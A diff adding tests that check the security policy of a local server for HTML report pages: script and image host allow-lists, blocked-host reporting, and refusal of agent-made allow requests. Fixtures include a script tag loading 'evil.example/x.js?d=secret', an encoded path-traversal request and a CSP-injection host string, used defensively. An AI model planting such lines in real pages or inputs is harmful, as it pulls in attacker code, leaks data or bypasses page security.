@@ -1364,6 +1364,24 @@ test('Artifacts: the files in a workspace storage folder, hidden ones not counte
   assert.equal((await fetch(`http://127.0.0.1:${port}/artifact/${'0'.repeat(widgetKey.length)}/${w.id}/site/index.html`)).status, 401)
   assert.equal((await fetch(`http://127.0.0.1:${port}/artifact/${widgetKey}/${w.id}/..%2f..%2fstate.json`)).status, 404)
   assert.equal((await fetch(`http://127.0.0.1:${port}/artifact/${widgetKey}/nope/site/index.html`)).status, 401) // another workspace: not with this key
+  // S18: scripts from three CDNs, pictures from its own folder; another host once allowed (this report, or always), and
+  // the viewer told what was blocked
+  writeFileSync(join(dir, 'site', 'chart.html'), '<script src="https://cdn.jsdelivr.net/npm/chart.js"></script><script src="https://evil.example/x.js?d=secret"></script><img src="https://i.imgur.com/a.png"><img srcset="https://i.imgur.com/b.png 2x">')
+  const cspOf = async (f = 'chart.html', at = port, key = widgetKey) => (await fetch(`http://127.0.0.1:${at}/artifact/${key}/${w.id}/site/${f}`)).headers.get('content-security-policy')!
+  let csp = await cspOf()
+  assert.match(csp, /script-src 'self' 'unsafe-inline' https:\/\/cdnjs\.cloudflare\.com https:\/\/cdn\.jsdelivr\.net https:\/\/unpkg\.com;/)
+  assert.match(csp, /img-src 'self' data: blob:;/)
+  assert.doesNotMatch(csp, /evil\.example|imgur| https:;| https: /, 'no other host, no https: at large')
+  assert.deepEqual(await rig.rpc('artifactHosts', { ws: w.id, path: 'site/chart.html' }), { blocked: [{ host: 'evil.example', loads: { script: 1 } }, { host: 'i.imgur.com', loads: { image: 2 } }], allowed: [] }, "jsDelivr's script isn't blocked")
+  await assert.rejects(rig.rpc('artifactAllow', { ws: w.id, path: 'site/chart.html', hosts: ['127.0.0.1'] }), /names on the internet/)
+  await assert.rejects(rig.rpc('artifactAllow', { ws: w.id, path: 'site/chart.html', hosts: ['evil.example; script-src *'] }), /names on the internet/)
+  await rig.rpc('artifactAllow', { ws: w.id, path: 'site/chart.html', hosts: ['evil.example'] })
+  csp = await cspOf()
+  assert.match(csp, /script-src [^;]*https:\/\/evil\.example;/)
+  assert.doesNotMatch(await cspOf('index.html'), /evil/, 'for that report alone')
+  assert.deepEqual((await rig.rpc('artifactHosts', { ws: w.id, path: 'site/chart.html' })).blocked.map((b: any) => b.host), ['i.imgur.com'])
+  const tab0 = await rig.rpc('tabNew', { ws: w.id, preset: 'claude' }) // an agent's call: refused
+  await assert.rejects(rig.rpc('artifactAllow', { ws: w.id, path: 'site/chart.html', hosts: ['x.example'], from: { ws: w.id, tab: tab0.id } }), /let a report's page load from another host/)
   // workspace B's key opens neither A's artifacts nor a plan page
   const b = await rig.rpc('wsNew', { project: p.id, preset: 'none', name: 'other' })
   const bKey = (await rig.rpc('state')).workspaces.find((x: any) => x.id === b.id).artKey
@@ -1422,6 +1440,19 @@ test('Artifacts: the files in a workspace storage folder, hidden ones not counte
   rmSync(join(dir, 'report.md'))
   rmSync(join(dir, '.laki-links.json'))
   await until(async () => (await ws()).artifacts === undefined, 'none again')
+  // always: a setting, every report's, kept through a restart
+  await rig.rpc('settingsSet', { artifactHosts: ['i.imgur.com', 'localhost', '10.0.0.1', 'I.IMGUR.com'] })
+  assert.deepEqual((await rig.rpc('state')).settings.artifactHosts, ['i.imgur.com'], 'names on the internet only, once')
+  await rig.stop()
+  await rig.start()
+  const at = rig.info().port
+  const key2 = (await rig.rpc('state')).workspaces.find((x: any) => x.id === w.id).artKey
+  mkdirSync(join(dir, 'site'), { recursive: true })
+  writeFileSync(join(dir, 'site', 'later.html'), '<img src="https://i.imgur.com/a.png">')
+  csp = await cspOf('later.html', at, key2)
+  assert.match(csp, /img-src 'self' data: blob: https:\/\/i\.imgur\.com;/)
+  writeFileSync(join(dir, 'site', 'chart.html'), '<script src="https://evil.example/x.js"></script>')
+  assert.doesNotMatch(await cspOf('chart.html', at, key2), /evil/, 'Allow for this report: until the daemon restarts')
 })
 
 test("new worktrees: the page's base is the repo's main branch; Sync the base branch fetches origin's first; the rail holds 5 pins", async t => {
